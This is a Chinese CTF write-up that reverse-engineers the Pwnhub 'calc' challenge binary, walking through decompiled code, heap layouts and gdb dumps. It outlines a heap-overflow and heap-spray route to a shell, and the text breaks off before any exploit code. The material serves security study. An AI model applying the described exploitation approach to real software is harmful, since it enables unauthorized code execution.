---
title: Pwnhub 故事的开始 calc
date: 2020-05-19 00:00:00
categories:
- CTF/Pwn
tags: 堆喷 __ctype_b_loc
---

> 漏洞点为一个整数溢出和一个堆溢出，其中整数溢出可以转化为另一个堆溢出。本题利用方法为利用原生的堆溢出漏洞，可以覆盖一个存在间接跳转的二级指针，因为没有开启NX，所以结合堆喷即可getshell。虽然堆喷解法的exp很简单，但本题的逆向却是是很耗时的。

- 题目文件：[calc](https://xuanxuanblingbling.github.io/assets/attachment/calc)

本题来自[pwnhub](https://pwnhub.cn/)的2016年的一次比赛，看起来好像是第一场比赛：[题目列表 / Calculator(需要pwnhub账户)](https://pwnhub.cn/questiondetail?id=1)，参考冠成师傅的Writeup：[pwnhub.cn 故事的开始 calc Writeup](https://atum.li/2016/12/05/calc/)

## 检查

```bash
➜  file calc
calc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=454ff27c25ea5028bffdcfaf81e1c178d5cbce3a, stripped
➜  checksec calc
[*] '/Users/Desktop/pwn/pwnhub/calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

32位程序，除了canary剩下的保护全没开。大概运行一下知道是个计算器

```bash
➜  ./calc 
> 1 + 1             
2
> 2 - 3
-1
> -1 + 3
invalid number
expected 2 arguments, got 1
```

## 逆向

这个逆向工作是我遇到Pwn题里最大的了，而且主要是因为算法看不懂，还没有符号表，所以特此记录下逆向的思考过程：

> 就这玩意，那天我看了仨小时，终于看明白了。上次比赛在mcfx的提示下跟那个恶心的虚拟机代码相了一会面，真是，逆向这个玩意需要一个字**静**。没人打扰，然后泡一杯茶或者咖啡，三四个小时后，一般会有顿悟。

### main

首先是main函数

```c
void __cdecl __noreturn main()
{
  int v0; // eax
  int v1; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  char *v11; // [esp+8h] [ebp-110h]
  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
  unsigned int v13; // [esp+10Ch] [ebp-Ch]

  v13 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  dword_804D0B0 = sub_804A929();
  dword_804D0B4 = sub_804A8E9();
  dword_804D0AC = sub_804A8E9();
  v0 = sub_804A83F("add", (int)sub_80494AA);
  sub_804A946(dword_804D0B0, "add", v0);
  v1 = sub_804A83F("sub", (int)sub_8049C81);
  sub_804A946(dword_804D0B0, "sub", v1);
  v2 = sub_804A83F("mul", (int)sub_8049A0E);
  sub_804A946(dword_804D0B0, "mul", v2);
  v3 = sub_804A83F("div", (int)sub_8049DED);
  sub_804A946(dword_804D0B0, "div", v3);
  v4 = sub_804A83F("mod", (int)sub_8049F90);
  sub_804A946(dword_804D0B0, "mod", v4);
  v5 = sub_804A83F("not", (int)sub_804A135);
  sub_804A946(dword_804D0B0, "not", v5);
  v6 = sub_804A83F("int", (int)sub_8049854);
  sub_804A946(dword_804D0B0, "int", v6);
  v7 = sub_804A83F("exit", (int)sub_804A688);
  sub_804A946(dword_804D0B0, "exit", v7);
  v8 = sub_804A83F("equals", (int)sub_804A3C2);
  sub_804A946(dword_804D0B0, "equals", v8);
  v9 = sub_804A83F("type", (int)sub_804A61E);
  sub_804A946(dword_804D0B0, "type", v9);
  v10 = sub_804A83F("len", (int)sub_804A308);
  sub_804A946(dword_804D0B0, "len", v10);
  while ( 1 )
  {
    memset(s, 0, sizeof(s));
    printf("> ");
    if ( !fgets(s, 256, stdin) )
      break;
    v11 = strrchr(s, 10);
    if ( v11 )
      *v11 = 0;
    sub_8048BC1(s);
  }
  exit(0);
}
```

#### 全局变量

首先`dword_804D0B0、dword_804D0B4、dword_804D0AC`是三个全局变量，赋值的三个函数分别是在堆上申请0x10,0x84,0x84大小的堆空间的地址，并初始化为0。

#### 运算符定义

然后是重复的这种代码：

```c
v0 = sub_804A83F("add", (int)sub_80494AA);
sub_804A946(dword_804D0B0, "add", v0);
```

其中`sub_804A83F`就是创造了一个结构体，结构体中包括了：

1. add这个字符串的地址 
2. function字符串的地址
3. 还有第二个参数`sub_80494AA`这个函数的地址，大概看了这个函数，估计就是加法的实现

故`sub_804A83F`这个函数看起来就是将add字符串和加法处理函数绑定为一个结构体。

然后就是`sub_804A946`，参数是第一个保存着一个0x10大小堆块地址的全局变量，add字符串，以及刚才创造出来的结构体，函数较复杂，接下来详细分析。

#### 输入处理

然是很重要的：**处理输入的部分**：

```c
while ( 1 )
{
   memset(s, 0, sizeof(s));
   printf("> ");
   if ( !fgets(s, 256, stdin) )
   break;
   v11 = strrchr(s, 10);
   if ( v11 )
   *v11 = 0;
   sub_8048BC1(s);
}
```

> The fgets() function reads at most one less than the number of characters specified by size from the given stream and stores them in the string str.

可以看到在man命令中的描述fgets是会接收一个size-1长度的输入，本题的缓冲区在栈上也是256字节，所以不会存在0字节溢出。接收完输入就送到`sub_8048BC1`函数中去处理了，故看起来`sub_8048BC1`就是最后的处理函数。

### sub_804A946

然后我们来看一下在运算符定义那个函数：`sub_804A946`：

#### 第一次进入

首先以add定义为例，传入该函数的参数分别是：

1. dword_804D0B0
2. "add"
3. `sub_804A83F`创造出的结构体

这个函数如下，如果想看干净一点的可以把IDA给出的注释隐藏起来，右键hist casts即可。

```c
int __cdecl sub_804A946(int a1, char *s, int a3)
{
  int result; // eax
  size_t i; // [esp+4h] [ebp-14h]
  int v5; // [esp+8h] [ebp-10h]
  signed int v6; // [esp+Ch] [ebp-Ch]

  if ( !*(_DWORD *)a1 )
  {
    *(_DWORD *)a1 = calloc(0x10u, 1u);
    *(_BYTE *)(*(_DWORD *)a1 + 8) = *s;
  }
  v5 = *(_DWORD *)a1;
  v6 = strlen(s);
  for ( i = 0; (int)i <= v6; ++i )
  {
    while ( *(_DWORD *)(v5 + 4) && *(_BYTE *)(v5 + 8) != s[i] )
      v5 = *(_DWORD *)(v5 + 4);
    if ( *(_BYTE *)(v5 + 8) != s[i] )
    {
      *(_DWORD *)(v5 + 4) = calloc(0x10u, 1u);
      *(_BYTE *)(*(_DWORD *)(v5 + 4) + 8) = s[i];
      v5 = *(_DWORD *)(v5 + 4);
      while ( strlen(s) > i )
      {
        *(_DWORD *)v5 = calloc(0x10u, 1u);
        *(_BYTE *)(*(_DWORD *)v5 + 8) = s[++i];
        v5 = *(_DWORD *)v5;
      }
      break;
    }
    if ( !s[i] )
      break;
    if ( !*(_DWORD *)v5 )
    {
      *(_DWORD *)v5 = calloc(0x10u, 1u);
      *(_BYTE *)(*(_DWORD *)v5 + 8) = s[i + 1];
    }
    v5 = *(_DWORD *)v5;
  }
  result = v5;
  *(_DWORD *)(v5 + 12) = a3;
  return result;
}
```

不过无论因不隐藏注释，这个函数的确是有点恐怖，一堆没名字的变量，然后还有一堆星。不过不要害怕，静下来，一行一行看就是了：

```c
if ( !*(_DWORD *)a1 )
  {
    *(_DWORD *)a1 = calloc(0x10u, 1u);
    *(_BYTE *)(*(_DWORD *)a1 + 8) = *s;
  }
```

- 首先检查`*a1`是否有内容，`a1`是dword_804D0B0，即a1保存了一个堆上申请大小为0x10的空间的地址，但`*a1`是这个0x10的堆空间，显然这个堆内存是刚刚申请的并没有被使用，所以会进入到这个if判断中。
- 然后会在申请一个大小为0x10的堆空间，并且把新申请的地址放到*a1这个堆空间的前四个字节处
- 第三句去了注释为：`*(*a1 + 8) = *s;`，可以看到去掉注释是丢了信息：`(_BYTE *)`，这个意思是之赋值一个字节，所以还是要留意IDA给出的注释的
- `*(*a1 + 8) = *s;`的意思是，将第二个参数的`"add"`的第一个字节，也是第一个字符`'a'`，放到新申请的堆块的第9个字节上。（很奇怪的操作）

当前的数据结构大致如下:

```python
       bss                               heap                              heap
+---------------+                 +---------------+                 +---------------+
|    &chunk1    | +-------------> |    &chunk2    | +-------------> |               |
+---------------+                 +---------------+                 +---------------+
  dword_804D0B0                   |               |                 |               |
                                  +---------------+                 +---------------+
                                  |               |                 |      'a'      |
                                  +---------------+                 +---------------+
                                  |               |                 |               |
                                  +---------------+                 +---------------+

                                        chunk1                           chunk2
```


```c
v5 = *(_DWORD *)a1;
v6 = strlen(s);
```

然后将新申请的堆块(chunk2)的地址，赋值给v5，`"add"`字符串的长度3，赋值给v6，然后进入以v6为判断条件的for循环，进入后紧接着是一个while循环：

```c
while ( *(_DWORD *)(v5 + 4) && *(_BYTE *)(v5 + 8) != s[i] )
      v5 = *(_DWORD *)(v5 + 4);
```

`*(v5+4)`就是chunk2的第2个slot为空，所以不会进入这个循环，继续往下：

```c
if ( *(_BYTE *)(v5 + 8) != s[i] )
```

当前i为0，`*(v5 + 8)`是`'a'`，`s[0]`也是`'a'`，故也不会进入这个if分支：

```c
if ( !s[i] )
```

`s[0]`是`'a'`，非空，故也不仅进入这个分支，继续

```c
if ( !*(_DWORD *)v5 )
    {
      *(_DWORD *)v5 = calloc(0x10u, 1u);
      *(_BYTE *)(*(_DWORD *)v5 + 8) = s[i + 1];
    }
    v5 = *(_DWORD *)v5;
```

`*v5`是chunk2中的第一个元素，为空，故进入这个分支，发现又会申请一个0x10的chunk3，然后把chunk3的地址放到chunk2的第一个元素上，并且把"add"的第2个字符`'d'`，放入chunk3的第9个字节处。然后更新v5为chunk3的地址继续循环，此时数据结构为：

```python
       bss                               heap                              heap                              heap
+---------------+                 +---------------+                 +---------------+                 +---------------+
|    &chunk1    | +-------------> |    &chunk2    | +-------------> |    &chunk3    | +-------------> |               |
+---------------+                 +---------------+                 +---------------+                 +---------------+
  dword_804D0B0                   |               |                 |               |                 |               |
                                  +---------------+                 +---------------+                 +---------------+
                                  |               |                 |      'a'      |                 |      'd'      |
                                  +---------------+                 +---------------+                 +---------------+
                                  |               |                 |               |                 |               |
                                  +---------------+                 +---------------+                 +---------------+

                                        chunk1                           chunk2                            chunk3
```

for循环i的变化为0-3，当i=1时：

```python


       bss                               heap                              heap                              heap                              heap
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+
|    &chunk1    | +-------------> |    &chunk2    | +-------------> |    &chunk3    | +-------------> |    &chunk4    | +-------------> |               |
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+
  dword_804D0B0                   |               |                 |               |                 |               |                 |               |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+
                                  |               |                 |      'a'      |                 |      'd'      |                 |      'd'      |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+
                                  |               |                 |               |                 |               |                 |               |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+

                                        chunk1                           chunk2                            chunk3                            chunk4

```

当i=2时：

```python
       bss                               heap                              heap                              heap                              heap                              heap
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+
|    &chunk1    | +-------------> |    &chunk2    | +-------------> |    &chunk3    | +-------------> |    &chunk4    | +-------------> |    &chunk5    | +-------------> |               |
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+
  dword_804D0B0                   |               |                 |               |                 |               |                 |               |                 |               |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+
                                  |               |                 |      'a'      |                 |      'd'      |                 |      'd'      |                 |               |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+
                                  |               |                 |               |                 |               |                 |               |                 |               |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+

                                        chunk1                           chunk2                            chunk3                            chunk4                            chunk5
```

当i=3时，`s[3]`为空，会进入break分支终止循环：

```c
if ( !s[i] )
      break;
```

最后会执行：

```c
result = v5;
*(_DWORD *)(v5 + 12) = a3;
return result;
```

将最后一个chunk的最后四个字节写为a3的值，a3就是`sub_804A83F`函数创造出的结构体的地址，然后返回指向最后一个chunk的指针，最后的结构体如下：

```python
                                         heap
                                  +---------------+
                                  |    &"add"     | <---------------------------------------------------------------------------------------------------------------------------------------------------+
                                  +---------------+                                                                                                                                                     |
                                  |  &"function"  |                                                                                                                                                     |
                                  +---------------+                                                                                                                                                     |
                                  |  sub_80494AA  |                                                                                                                                                     |
                                  +---------------+                                                                                                                                                     |
                                  |               |                                                                                                                                                     |
                                  +---------------+                                                                                                                                                     |
                                                                                                                                                                                                        |
                                       chunk0                                                                                                                                                           |
                                                                                                                                                                                                        |
                                                                                                                                                                                                        |
       bss                               heap                              heap                              heap                              heap                              heap                   |
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+             |
|    &chunk1    | +-------------> |    &chunk2    | +-------------> |    &chunk3    | +-------------> |    &chunk4    | +-------------> |    &chunk5    | +-------------> |               |             |
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+             |
  dword_804D0B0                   |               |                 |               |                 |               |                 |               |                 |               |             |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+             |
                                  |               |                 |      'a'      |                 |      'd'      |                 |      'd'      |                 |               |             |
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+             |
                                  |               |                 |               |                 |               |                 |               |                 |    &chunk0    +-------------+
                                  +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+

                                        chunk1                           chunk2                            chunk3                            chunk4                            chunk5

```

我们可以在gdb中看一下当程序初始化后，堆的状态是否和我给出的一致：

```c
➜  gdb -q ./calc 
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./calc...(no debugging symbols found)...done.
gef➤  r
Starting program: /mnt/hgfs/桌面/pwn/pwnhub/calc/calc 
> ^C
gef➤  heap chunks
Chunk(addr=0x804e008, size=0x18, flags=PREV_INUSE)
    [0x0804e008     58 e1 04 08 00 00 00 00 00 00 00 00 00 00 00 00    X...............]
Chunk(addr=0x804e020, size=0x88, flags=PREV_INUSE)
    [0x0804e020     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x804e0a8, size=0x88, flags=PREV_INUSE)
    [0x0804e0a8     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x804e130, size=0x18, flags=PREV_INUSE)
    [0x0804e130     48 e1 04 08 99 ae 04 08 aa 94 04 08 00 00 00 00    H...............]
Chunk(addr=0x804e148, size=0x10, flags=PREV_INUSE)
    [0x0804e148     61 64 64 00 00 00 00 00 00 00 00 00 19 00 00 00    add.............]
Chunk(addr=0x804e158, size=0x18, flags=PREV_INUSE)
    [0x0804e158     70 e1 04 08 e0 e1 04 08 61 00 00 00 00 00 00 00    p.......a.......]
Chunk(addr=0x804e170, size=0x18, flags=PREV_INUSE)
    [0x0804e170     88 e1 04 08 00 00 00 00 64 00 00 00 00 00 00 00    ........d.......]
Chunk(addr=0x804e188, size=0x18, flags=PREV_INUSE)
    [0x0804e188     a0 e1 04 08 00 00 00 00 64 00 00 00 00 00 00 00    ........d.......]
Chunk(addr=0x804e1a0, size=0x18, flags=PREV_INUSE)
    [0x0804e1a0     00 00 00 00 00 00 00 00 00 00 00 00 30 e1 04 08    ............0...]
```

完美对应：

- `chunk1: 0x804e008`
- `chunk2: 0x804e158`
- `chunk3: 0x804e170`
- `chunk4: 0x804e188`
- `chunk5: 0x804e1a0`
- `chunk0: 0x804e130`

#### 第二次进入

可以看到第一次我们是有两个分支没有进入的，我们看一下当我们第二次进入这个函数时会发生怎样的效果呢？有了第一次的分析，第二次则会容易的多，我们来看看main函数初始化sub运算时：

```c
v1 = sub_804A83F("sub", (int)sub_8049C81);
sub_804A946(dword_804D0B0, "sub", v1);
```

进入sub_804A946这个函数时的情景吧：

```c
if ( !*(_DWORD *)a1 )
```

首先仍然会判断第一个参数dword_804D0B0，不过因为数据结构还是如上图的状态，dword_804D0B0指向chunk1，chunk1的第一个元素是指向chunk2的指针，非空，所以不会进入这个分支，继续：

```c
v5 = *(_DWORD *)a1;
v6 = strlen(s);
```

然后将chunk2的地址赋值给v5，"sub"的长度3，赋值给v6，然后进入循环，进入后还是先看while：

```c
 while ( *(_DWORD *)(v5 + 4) && *(_BYTE *)(v5 + 8) != s[i] )
      v5 = *(_DWORD *)(v5 + 4);
```

chunk2的第二个元素仍然是空，所以仍然不进入这个循环，继续：

```c
 if ( *(_BYTE *)(v5 + 8) != s[i] )
```

当前v5是指向chunk2的，所以chunk2的第3个元素是`'a'`，而`s[0]`是`'s'`，二者不相等，故进入该分支。

```c
*(_DWORD *)(v5 + 4) = calloc(0x10u, 1u);
*(_BYTE *)(*(_DWORD *)(v5 + 4) + 8) = s[i];
v5 = *(_DWORD *)(v5 + 4);
```

然后又是申请0x10的堆空间，然后将新堆块的地址放到chunk2的第2个元素上，然后将`s[0]`即's'写到新堆块的第三个元素上，然后将v5更新为指向新堆块的指针

```c
while ( strlen(s) > i )
{
   *(_DWORD *)v5 = calloc(0x10u, 1u);
   *(_BYTE *)(*(_DWORD *)v5 + 8) = s[++i];
   v5 = *(_DWORD *)v5;
}
break;
```

然后不断的申请堆块，填写"sub"的后两个字符，到新的堆块中，最后退出整个大循环，继续：

```c
result = v5;
*(_DWORD *)(v5 + 12) = a3;
return result;
```

将最开始的一个结构体链接到最后一个堆块上，并返回最后一个堆块的地址，完成第二次进入后数据结构如下：

```python
       bss                               heap                              heap                              heap                              heap                              heap                             heap
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+                +---------------+
|    &chunk1    | +-------------> |    &chunk2    | +-------------> |    &chunk3    | +-------------> |    &chunk4    | +-------------> |    &chunk5    | +-------------> |               |       +------> |    &"add"     |
+---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+                 +---------------+       |        +---------------+
  dword_804D0B0                   |               |        +------+ |    &chunk6    |                 |               |                 |               |                 |               |       |        |  &"function"  |
                                  +---------------+        |        +---------------+                 +---------------+                 +---------------+                 +---------------+       |        +---------------+
                                  |               |        |        |      'a'      |                 |      'd'      |                 |      'd'      |                 |               |       |        |  sub_80494AA  |
                                  +---------------+        |        +---------------+                 +---------------+                 +---------------+                 +---------------+       |        +---------------+
                                  |               |        |        |               |                 |               |                 |               |                 |  &chunk_add   | +-----+        |               |
                                  +---------------+        |        +---------------+                 +---------------+                 +---------------+                 +---------------+                +---------------+
                                                           |
                                        chunk1             |             chunk2                            chunk3                            chunk4                            chunk5                           chunk_add
                                                           |
                                                           |
                                                           |
                                                           |               heap                              heap                              heap                              heap                             heap
                                                           |        +---------------+                 +---------------+                 +---------------+                 +---------------+                +---------------+
                                                           +------> |    &chunk7    | +-------------> |    &chunk8    | +-------------> |    &chunk9    | +-------------> |               |       +------> |    &"sub"     |
                                                                    +---------------+                 +---------------+                 +---------------+                 +---------------+       |        +---------------+
                                                                    |               |                 |               |                 |               |                 |               |       |        |  &"function"  |
                                                                    +---------------+                 +---------------+                 +---------------+                 +---------------+       |        +---------------+
                                                                    |      's'      |                 |      'u'      |                 |      'b'      |                 |               |       |        |  sub_8049C81  |
                                                                    +---------------+                 +---------------+                 +---------------+                 +---------------+       |        +---------------+
                                                                    |               |                 |               |                 |               |                 |  &chunk_sub   | +-----+        |               |
                                                                    +---------------+                 +---------------+                 +---------------+                 +---------------+                +---------------+

                                                                         chunk6                            chunk7                            chunk8                            chunk9                           chunk_sub
```

所以分析到这大概也猜出来了，这就是根据我们输入来找处理函数的实现。而且也能看出来我们前两次都没有进去的循环：

```c
while ( *(_DWORD *)(v5 + 4) && *(_BYTE *)(v5 + 8) != s[i] )
      v5 = *(_DWORD *)(v5 + 4);
```

就是寻找到下一个可以在插入链表的地方，而且可以看到后面的那个判断，说明字母是可以重用的，比如"mod"和"mul"，的字母m，应该用的就是一个相同的m节点。

#### 总结

我们再来审视一下这个函数的全貌（隐藏了IDA的注释），是不是没有那么吓人了呢？

```c
int __cdecl sub_804A946(int a1, char *s, int a3)
{
  int result; // eax
  size_t i; // [esp+4h] [ebp-14h]
  int v5; // [esp+8h] [ebp-10h]
  signed int v6; // [esp+Ch] [ebp-Ch]

  if ( !*a1 )
  {
    *a1 = calloc(0x10u, 1u);
    *(*a1 + 8) = *s;
  }
  v5 = *a1;
  v6 = strlen(s);
  for ( i = 0; i <= v6; ++i )
  {
    while ( *(v5 + 4) && *(v5 + 8) != s[i] )
      v5 = *(v5 + 4);
    if ( *(v5 + 8) != s[i] )
    {
      *(v5 + 4) = calloc(0x10u, 1u);
      *(*(v5 + 4) + 8) = s[i];
      v5 = *(v5 + 4);
      while ( strlen(s) > i )
      {
        *v5 = calloc(0x10u, 1u);
        *(*v5 + 8) = s[++i];
        v5 = *v5;
      }
      break;
    }
    if ( !s[i] )
      break;
    if ( !*v5 )
    {
      *v5 = calloc(0x10u, 1u);
      *(*v5 + 8) = s[i + 1];
    }
    v5 = *v5;
  }
  result = v5;
  *(v5 + 12) = a3;
  return result;
}
```

总结一下这个函数的主要功能就是，将`dword_804D0B0`这个全局变量作为一个入口，创造出一个关于运算符与运算函数绑定的纵横交错的链表，想想这不就是**二叉树**么？

### sub_8048BC1

经过了上一个函数的洗礼，继续看这个对我们最终输入的处理函数，应该就不难了，虽然长，当时没有那么多的指针操作，基本都是逻辑上的处理，以及函数的调用：

```c
int __cdecl sub_8048BC1(char *s)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int result; // eax
  const char *v9; // eax
  char *s1; // [esp+0h] [ebp-48h]
  char *s1a; // [esp+0h] [ebp-48h]
  int v12; // [esp+4h] [ebp-44h]
  char *v13; // [esp+8h] [ebp-40h]
  int v14; // [esp+Ch] [ebp-3Ch]
  int v15; // [esp+10h] [ebp-38h]
  int v16; // [esp+14h] [ebp-34h]
  int v17; // [esp+18h] [ebp-30h]
  int v18; // [esp+1Ch] [ebp-2Ch]
  int v19; // [esp+20h] [ebp-28h]
  int v20; // [esp+24h] [ebp-24h]
  char *v21; // [esp+28h] [ebp-20h]
  char *v22; // [esp+2Ch] [ebp-1Ch]
  char *nptr; // [esp+30h] [ebp-18h]
  char *nptra; // [esp+30h] [ebp-18h]
  char *v25; // [esp+34h] [ebp-14h]
  int v26; // [esp+38h] [ebp-10h]
  int v27; // [esp+3Ch] [ebp-Ch]

  s1 = strtok(s, " ");
  while ( s1 )
  {
    if ( ((*__ctype_b_loc())[*s1] & 0x800) != 0 || *s1 == 45 && strlen(s1) > 1 )
    {
      if ( sub_804886B(s1) )
      {
        v12 = sub_804A6F8((char *)byte_804AC65, s1);
        sub_804A8B5(dword_804D0B4, v12);
      }
      else
      {
        puts("invalid number");
      }
      goto LABEL_61;
    }
    if ( *s1 == 34 )
    {
      s1a = s1 + 1;
      v13 = strchr(s1a, 34);
      if ( v13 )
      {
        *v13 = 0;
        v1 = sub_804A764((char *)byte_804AC65, s1a);
        sub_804A8B5(dword_804D0B4, v1);
      }
      else
      {
        printf("EOL while scanning string literal %s\n", s1a - 1);
      }
      goto LABEL_61;
    }
    if ( !strcmp(s1, "var") )
    {
      v21 = strtok(0, " ");
      v22 = strtok(0, " ");
      if ( !v22 )
        break;
      if ( *v22 == 61 )
      {
        nptr = strtok(0, " ");
        if ( !nptr )
        {
          puts("invalid syntax");
          break;
        }
        if ( *nptr == 34 )
        {
          nptra = nptr + 1;
          v25 = strchr(nptra, 34);
          if ( v25 )
          {
            *v25 = 0;
            v2 = sub_804A764(v21, nptra);
            sub_804A946(dword_804D0B0, v21, v2);
          }
        }
        else if ( !strcmp(nptr, "False") )
        {
          v3 = sub_804A7CC(v21, nptr);
          sub_804A946(dword_804D0B0, v21, v3);
        }
        else
        {
          if ( !strcmp(nptr, "True") )
            v4 = sub_804A7CC(v21, nptr);
          else
            v4 = sub_804A6F8(v21, nptr);
          sub_804A946(dword_804D0B0, v21, v4);
        }
      }
      else
      {
        v5 = sub_804A6F8(v21, "0");
        sub_804A946(dword_804D0B0, v21, v5);
      }
LABEL_61:
      s1 = strtok(0, " ");
    }
    else if ( !strcmp(s1, "True") )
    {
      v6 = sub_804A7CC((char *)byte_804AC65, "True");
      sub_804A8B5(dword_804D0B4, v6);
      s1 = strtok(0, " ");
    }
    else
    {
      if ( strcmp(s1, "False") )
      {
        if ( !strcmp(s1, "+") )
        {
          v14 = *(_DWORD *)(sub_804AADE(dword_804D0B0, "add") + 12);
          if ( !strcmp(*(const char **)(v14 + 4), "function") )
            sub_804A8B5(dword_804D0AC, v14);
          else
            sub_804A8B5(dword_804D0B4, v14);
        }
        else if ( !strcmp(s1, "-") )
        {
          v15 = *(_DWORD *)(sub_804AADE(dword_804D0B0, "sub") + 12);
          if ( !strcmp(*(const char **)(v15 + 4), "function") )
            sub_804A8B5(dword_804D0AC, v15);
          else
            sub_804A8B5(dword_804D0B4, v15);
        }
        else if ( !strcmp(s1, "*") )
        {
          v16 = *(_DWORD *)(sub_804AADE(dword_804D0B0, "mul") + 12);
          if ( !strcmp(*(const char **)(v16 + 4), "function") )
            sub_804A8B5(dword_804D0AC, v16);
          else
            sub_804A8B5(dword_804D0B4, v16);
        }
        else if ( !strcmp(s1, "/") )
        {
          v17 = *(_DWORD *)(sub_804AADE(dword_804D0B0, "div") + 12);
          if ( !strcmp(*(const char **)(v17 + 4), "function") )
            sub_804A8B5(dword_804D0AC, v17);
          else
            sub_804A8B5(dword_804D0B4, v17);
        }
        else if ( !strcmp(s1, "%") )
        {
          v18 = *(_DWORD *)(sub_804AADE(dword_804D0B0, "mod") + 12);
          if ( !strcmp(*(const char **)(v18 + 4), "function") )
            sub_804A8B5(dword_804D0AC, v18);
          else
            sub_804A8B5(dword_804D0B4, v18);
        }
        else if ( !strcmp(s1, "==") )
        {
          v19 = *(_DWORD *)(sub_804AADE(dword_804D0B0, "equals") + 12);
          if ( !strcmp(*(const char **)(v19 + 4), "function") )
            sub_804A8B5(dword_804D0AC, v19);
          else
            sub_804A8B5(dword_804D0B4, v19);
        }
        else if ( sub_804AADE(dword_804D0B0, s1) )
        {
          v20 = *(_DWORD *)(sub_804AADE(dword_804D0B0, s1) + 12);
          if ( !strcmp(*(const char **)(v20 + 4), "function") )
            sub_804A8B5(dword_804D0AC, v20);
          else
            sub_804A8B5(dword_804D0B4, v20);
        }
        else
        {
          printf("name '%s' is not defined \n", s1);
        }
        goto LABEL_61;
      }
      v7 = sub_804A7CC((char *)byte_804AC65, "False");
      sub_804A8B5(dword_804D0B4, v7);
      s1 = strtok(0, " ");
    }
  }
  while ( !sub_804A8D7(dword_804D0AC) )
  {
    v26 = sub_804A88E(dword_804D0AC);
    (*(void (**)(void))(v26 + 8))();
  }
  result = sub_804A8D7(dword_804D0B4);
  if ( !result )
  {
    v27 = sub_804A88E(dword_804D0B4);
    if ( !strcmp(*(const char **)(v27 + 4), "int") )
    {
      result = printf("%d\n", *(_DWORD *)(v27 + 8));
    }
    else if ( !strcmp(*(const char **)(v27 + 4), "str") )
    {
      result = puts(*(const char **)(v27 + 8));
    }
    else
    {
      result = strcmp(*(const char **)(v27 + 4), "bool");
      if ( !result )
      {
        if ( *(_DWORD *)(v27 + 8) == 1 )
          v9 = "True";
        else
          v9 = "False";
        result = puts(v9);
      }
    }
  }
  return result;
}
```

如果在IDA中看着不舒服可以复制到vscode中将代码块收起，可以看出整个函数大致分为三个部分：

1. `while ( s1 )`
2. `while ( !sub_804A8D7(dword_804D0AC) )`
3. `if ( !result )`

分析完大概清楚了以上三个部分的功能：

1. 第一个部分就会对我们的输入进行解析，根据空格，每个运算符和运算数都会被封装为一个结构体，另外两个全局变量就是用来保存的运算符与运算数的结构体的指针，支持除了"+-*/"这种符号以外，还支持"sub add mul mod"等英文运算符，以及var定义变量
2. 根据两个全局变量存放的运算符和运算数进行运算，调用运算符结构体中的第三个元素，即在main函数注册的函数，运算后的结果保存到最后剩下的一个运算数中
3. 最后根据类型返回运算数中最后的一个元素

不过这里有两个地方值得提一下

#### strtok

这个函数就是按照给定字符划分字符串，不过这个函数是可以保存上下文的，每次调用返回一个字符串，除第一次调用需要传入原始字符串，之后只需要传入NULL即可获取下一个被分隔的字符串：

```c
# include <string.h>
# include <stdio.h>

int main(){
    char s[]= "hello world I am xuanxuan";
    printf("%s\n",strtok(s," "));
    printf("%s\n",strtok(NULL," "));
    printf("%s\n",strtok(NULL," "));
    printf("%s\n",strtok(NULL," "));
    printf("%s\n",strtok(NULL," "));
}
```

输出为：

```c
hello
world
I
am
xuanxuan
```

所以看到上述函数中的`go LABEL_61`：

```c
LABEL_61:
      s1 = strtok(0, " ");
```

其实就是继续按空格拆分字符串

#### __ctype_b_loc

另外在这函数中上来有这么一个表达式：

```c
((*__ctype_b_loc())[*s1] & 0x800) != 0
```

- [ctype.h](https://sites.uclouvain.be/SystInfo/usr/include/ctype.h.html)
- [C 标准库系列之ctype.h](https://www.cnblogs.com/haomiao/p/6128459.html)

其实就是一个判断字符的函数的宏定义的展开，如下源码：


```c
# include <stdio.h>
# include <ctype.h>

char s = 'a';

int main(){
    printf("isalnum %d\n",isalnum(s));
    printf("isalpha %d\n",isalpha(s));
    printf("iscntrl %d\n",iscntrl(s));
    printf("isdigit %d\n",isdigit(s));
    printf("isgraph %d\n",isgraph(s));
    printf("islower %d\n",islower(s));
    printf("isprint %d\n",isprint(s));
    printf("ispunct %d\n",ispunct(s));
    printf("isspace %d\n",isspace(s));
    printf("isupper %d\n",isupper(s));
    printf("isxdigit %d\n",isxdigit(s));
    printf("isblank %d\n",isblank(s));
}
```

在linux上编译后的ELF文件通过IDA解析后如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
